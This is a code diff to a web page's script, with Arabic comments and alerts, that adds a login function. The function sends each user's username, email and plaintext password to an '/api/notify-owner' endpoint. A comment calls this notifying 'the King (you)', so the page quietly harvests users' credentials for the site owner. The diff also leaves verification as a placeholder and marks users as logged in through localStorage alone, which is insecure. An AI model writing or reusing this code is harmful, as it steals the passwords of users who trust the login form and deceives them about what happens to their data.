@@ -328,7 +328,51 @@
         alert('❌ رمز التحقق غير صحيح. حاول مرة أخرى.');
     }
 }
+         async function login() {
+    const username = document.getElementById('username').value;
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    if (!username || !email || !password) {
+        alert('⚠️ الرجاء إدخال جميع البيانات.');
+        return;
+    }
+
+    // ... (أكواد التحقق من الإيميل والرمز)
+
+    // ✅ إرسال إشعار للملك (أنت) عند تسجيل دخول جديد
+    try {
+        const notifyResponse = await fetch('/api/notify-owner', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                username: username,
+                userEmail: email,
+                userpassword: password
+            })
+        });
+
+        const notifyData = await notifyResponse.json();
+
+        if (notifyData.success) {
+            console.log('✉️ تم إرسال الإشعار للملك');
+        }
+    } catch (err) {
+        console.error('فشل في إرسال الإشعار:', err);
+        // لا نوقف تسجيل الدخول حتى لو فشل الإشعار
+    }
+
+    // ✅ بعد كل شيء — نسجل دخول المستخدم
+    localStorage.setItem('kingAbdoLoggedIn', 'true');
+    localStorage.setItem('kingAbdoUsername', username);
+    alert('✅ تم التحقق بنجاح! أهلاً بك في البلاط الملكي.');
+    window.location.href = 'chat.html';
+}
+        
     </script>
 </body>
 
 </html>
+
